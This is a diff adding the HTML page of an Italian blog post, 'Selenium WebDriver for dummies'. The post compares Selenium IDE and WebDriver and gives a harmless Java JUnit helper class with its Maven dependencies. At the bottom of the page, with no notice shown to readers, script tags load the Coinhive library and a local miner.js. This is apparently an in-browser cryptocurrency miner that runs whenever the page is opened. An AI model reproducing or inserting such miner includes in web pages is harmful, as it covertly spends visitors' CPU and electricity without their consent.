@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>Selenium WebDriver for dummies - Michele Nasti's blog</title>
+	<meta name="description" content="Esistono tool che permettono di scrivere i casi di test che simulano il comportamento dell’utente e di eseguirli all’infinito, cosa utile per individuare eventuali regressioni durante lo sviluppo.
+
+" />
+	<meta name="keywords" content="selenium, test automatici, webdriver" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="Selenium WebDriver for dummies" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/" property="og:url">
+
+
+
+  <meta content="2015-05-26T10:58:58+02:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="selenium" property="article:tag">
+  
+  <meta content="test automatici" property="article:tag">
+  
+  <meta content="webdriver" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="Selenium WebDriver for dummies">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2015/05/selenium-webdriver-for-dummies/">Selenium WebDriver for dummies</a></h1>
+			<p class="post-meta">May 26, 2015 • musikele</p>
+		</header>
+
+		<section>
+
+			<p>Esistono tool che permettono di scrivere i casi di test che simulano il comportamento dell’utente e di eseguirli all’infinito, cosa utile per individuare eventuali regressioni durante lo sviluppo.</p>
+
+<p>Il più diffuso a livello globale, per i test di tipo funzionale, è <strong>Selenium</strong>, nelle sue varianti <strong>Selenium IDE</strong> e <strong>Selenium Web Driver</strong>. Abbiamo testato entrambi e alla fine abbiamo scelto WebDriver. (Ora esistono altri tool come Protractor, ma bisogna riconoscere che Selenium per anni è stato il più diffuso).</p>
+
+<h3 id="selenium-ide">Selenium IDE</h3>
+
+<p>Sulla carta era la scelta migliore per gli utenti-tester: permette di memorizzare i passaggi fatti dall’utente sulla pagina, memorizzando i click del mouse e le digitazioni sulla tastiera, senza scrivere codice.</p>
+
+<p>I problemi riscontrati sono stati i seguenti:</p>
+
+<ul>
+  <li><strong>alta instabilità</strong> del sistema con il nostro applicativo, dovuto all’elevato numero di componenti caricati e agli iframe ; ciò causava crash e stalli del browser;</li>
+  <li>il sistema “punta e clicca” spesso <strong>non riconosce le azioni dell’utente</strong></li>
+  <li>per riuscire a far funzionare casi di test anche molto semplici era necessario <strong>intervenire manualmente sul codice prodotto</strong>;</li>
+  <li><strong>scarso supporto alle webapp moderne</strong> che usano tecnologie come AJAX, per caricare pezzi di pagine dinamicamente.</li>
+</ul>
+
+<h3 id="selenium-webdriver">Selenium WebDriver</h3>
+
+<p><strong>Selenium WebDriver è il motore di Selenium IDE, tuttavia è decisamente più stabile e funzionale</strong>. E’ una libreria Java che, tramite la scrittura di semplici programmi, permette di automatizzare la navigazione (e il test) di pagine web. Lo svantaggio di questo approccio è che <strong>figure non tecniche, che non hanno basi di programmazione, potrebbero essere titubanti all’idea di scrivere test in un linguaggio di programmazione</strong> che non conoscono.</p>
+
+<p>Per semplificare l’approccio alla scrittura dei casi di test ho pensato di creare una classe Java che semplifica le operazioni più comuni dei tester. Alcune funzionalità messe a disposizione sono:</p>
+
+<ul>
+  <li><strong>apertura e chiusura del browser</strong></li>
+  <li><strong>navigazione</strong> verso un indirizzo specifico</li>
+  <li><strong>login</strong> e <strong>logout</strong></li>
+  <li>possibilità di <strong>recuperare un oggetto dalla pagina</strong> (per poterlo poi utilizzare, ad esempio per simulare un click, o inviare testo, etc)</li>
+  <li>possibilità di <strong>navigare all’interno dei frame</strong>, cosa che con Selenium IDE è risultata particolarmente difficile;</li>
+  <li>possibilità di <strong>eseguire i test in batteria</strong>, su un server remoto con accesso a un browser, e di ottenere un report dei casi di test che falliscono</li>
+</ul>
+
+<p>Una delle funzioni più complesse che abbiamo dovuto realizzare, nell’ottica delle webapp asincrone, è di <strong>aspettare che un componente venisse caricato e mostrato all’interno della pagina</strong>. Il nostro approccio permette di aspettare (per un tempo prefissato) che un componente sia caricato e mostrato all’utente, e solo dopo renderlo disponibile al test. <em>Se non si seguisse questo approccio, si correrebbe il rischio di usare componenti non ancora caricati, o cliccare su elementi nascosti.</em></p>
+
+<p>Tutto ciò che è stato descritto in questo semplice documento è in teoria possibile realizzarlo anche con Selenium IDE; a causa dei frequenti crash e stalli del sistema abbiamo notato come l’approccio WebDriver sia risultato più semplice sia per il tester sia per colui che dovrà eventualmente continuare l’evoluzione della libreria.</p>
+
+<h3 id="il-codice">Il codice</h3>
+
+<p>riporto la classe che abbiamo scritto per i nostri test. Questa classe va ereditata dai vostri test junit e i suoi metodi pubblici sono ciò che potrebbero servirvi di più.</p>
+
+<p>Il metodo più utile, per noi, è <span class="lang:java decode:true crayon-inline">waitAndReturnTheObject</span> che aspetta che l’elemento venga creato nel DOM e mostrato all’utente, e una volta recuperato lo restituisce. Gli altri metodi hanno un javadoc che potreste trovare utile.</p>
+
+<p>Essendo un JUnit non dovreste avere troppi problemi a eseguire i problemi con un tool come Maven.</p>
+
+<pre class="lang:java decode:true" title="SeleniumWebDriverBaseTest">package utils;
+
+import static org.junit.Assert.fail;
+
+import java.util.List;
+import java.util.concurrent.Callable;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.TimeoutException;
+import java.util.logging.Logger;
+
+import org.junit.After;
+import org.junit.Before;
+import org.openqa.selenium.By;
+import org.openqa.selenium.NoSuchElementException;
+import org.openqa.selenium.WebDriver;
+import org.openqa.selenium.WebElement;
+import org.openqa.selenium.firefox.FirefoxDriver;
+
+/**
+ * Classe statica che aiuta a sviluppare test con Selenium Web driver.
+ */
+public class SeleniumWebDriverBaseTest {
+
+    protected WebDriver driver;
+    protected String baseUrl;
+    private StringBuffer verificationErrors = new StringBuffer();
+    private final ExecutorService service = Executors.newSingleThreadExecutor();
+    public static final int TIMEOUT = 30;
+    private static final Logger LOGGER = Logger.getLogger(
+        SeleniumWebDriverBaseTest.class.getSimpleName());
+
+
+    @Before
+    public void setUp() throws Exception {
+        driver = new FirefoxDriver();
+        baseUrl = "http://localhost:8080/";
+        driver.manage().timeouts().implicitlyWait(TIMEOUT, TimeUnit.SECONDS);
+        driver.get(baseUrl);
+        LOGGER.info("connecting to " + baseUrl);
+    }
+
+    @After
+    public void tearDown() throws Exception {
+        driver.quit();
+        String verificationErrorString = verificationErrors.toString();
+        if (!"".equals(verificationErrorString)) {
+            fail(verificationErrorString);
+        }
+    }
+
+    /**
+     * Checks if the element is present into the DOM.
+     * Caution: it will answer true even if the element is present, but not visible. @see
+     * waitForLoadedAndDisplayed
+     *
+     * @param by     the selector to reach the element
+     * @return true if the element is found
+     */
+    public boolean isElementPresent(By by) {
+        try {
+            driver.findElement(by);
+            return true;
+        } catch (NoSuchElementException e) {
+            return false;
+        }
+    }
+
+    /**
+     * checks that the element is shown on video
+     *
+     * @param by     the selector
+     * @return true if the element is shown on video
+     */
+    public boolean isElementDisplayed(By by) {
+        try {
+            return driver.findElement(by).isDisplayed();
+        } catch (NoSuchElementException e) {
+            return false;
+        }
+    }
+
+    /**
+     * Stops the test for some time; useful to check if everything is going good.
+     *
+     * @param milliseconds
+     */
+    public static void pause(long milliseconds) {
+        try {
+            Thread.sleep(milliseconds);
+        } catch (InterruptedException e) {
+        }
+    }
+
+    /**
+     * This method checks that the element has been loaded into the DOM and shown.
+     *
+     * @param by the element selector
+     */
+    public void waitForLoadedAndDisplayed(final By by) {
+        LOGGER.info("waiting for " + by.toString());
+
+        final Future&lt;Void&gt; future = service.submit(new Callable&lt;Void&gt;() {
+
+            public Void call() throws Exception {
+                while (true) {
+                    if (isElementPresent(by) &amp;&amp; isElementDisplayed(by)) {
+                        LOGGER.info(by + " found");
+                        return null;
+                    }
+                }
+            }
+        });
+
+        try {
+            future.get(TIMEOUT, TimeUnit.SECONDS);
+        } catch (InterruptedException | ExecutionException | TimeoutException e) {
+            fail("search for " + by + " went timeout!");
+        }
+    }
+
+    /**
+     * utility method to move to other frames. 
+     * beware: it will always return to the parent frame first.
+     *
+     * @param url url to check if the frame contains it.
+     */
+    public void switchToFrame(String url) {
+        driver.switchTo().defaultContent();
+        LOGGER.info("Switchig to frame " + url);
+        List&lt;WebElement&gt; framesList = driver.findElements(By.xpath("//iframe"));
+
+        WebElement selectedFrame = null;
+
+        for (WebElement frame : framesList) {
+            if (frame.getAttribute("src").contains(url)) {
+                selectedFrame = frame;
+            }
+        }
+        LOGGER.info("Selected Frame: " + selectedFrame.getAttribute("src"));
+
+        driver.switchTo().frame(selectedFrame);
+        LOGGER.info("switched!");
+    }
+
+    /**
+     * go back to the default frame (the main document)
+     *
+     */
+    public void switchToDefaultFrame() {
+        driver.switchTo().defaultContent();
+    }
+
+    /**
+     * calls "waitForLoadedAndDisplayed(by)" and returns the element found, 
+     * that can be used easily.
+     * @param by element the selector.
+     * @return the WebElement chosen
+     */
+    public WebElement waitAndReturnTheObject(By by) {
+        waitForLoadedAndDisplayed(by);
+        WebElement element = driver.findElement(by);
+        LOGGER.info(element + " found!");
+        return element;
+    }
+}
+</pre>
+
+<h3 id="dipendenze-maven">Dipendenze Maven</h3>
+
+<p>Queste sono le dipendenze necessarie:</p>
+
+<pre class="lang:xhtml decode:true" title="maven dependencies ">&lt;dependency&gt;
+    &lt;groupId&gt;org.seleniumhq.selenium&lt;/groupId&gt;
+    &lt;artifactId&gt;selenium-java&lt;/artifactId&gt;
+    &lt;version&gt;2.45.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;junit&lt;/groupId&gt;
+    &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;version&gt;4.12&lt;/version&gt;
+&lt;/dependency&gt;</pre>
+
+<h3 id="cosa-manca">Cosa manca?</h3>
+
+<ul>
+  <li>sostituire la classe di logging con una più seria</li>
+  <li>caricare un progetto di esempio e un esempio di utilizzo</li>
+  <li>scrivere questa pagina in inglese</li>
+</ul>
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/&text=Selenium WebDriver for dummies:%20https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(Selenium WebDriver for dummies) + ':%20'  + encodeURIComponent(https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/&title=Selenium WebDriver for dummies&summary=&source=https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/';
+			var disqus_identifier = 'https://michelenasti.com/2015/05/selenium-webdriver-for-dummies/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2015/05/interpretare-html-una-stringa-popolata-da-angular-con-ng-bind-html/">Interpretare HTML in una stringa popolata da angular con ng-bind-html</a></h2>
+					</header>
+					<section>
+						<p>Lo sapevate che non potevate inserire del testo html all’interno di una variabile _bind_ata con angular? Eh? Eh? Lo sapevate?</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2015/05/interpretare-html-una-stringa-popolata-da-angular-con-ng-bind-html/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/">iFrame, Safari, iOs e la lotta all'ultimo millisecondo</a></h2>
+					</header>
+					<section>
+						<p>Tutto è nato da una richiesta innocua da parte del capo: la webapp che abbiamo realizzato, e che deve operare principalmente sui pc del nostro cliente, sarà mostrata ad un’importante fiera a fine maggio, quindi dobbiamo rivederla e ottimizzarla per tablet.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
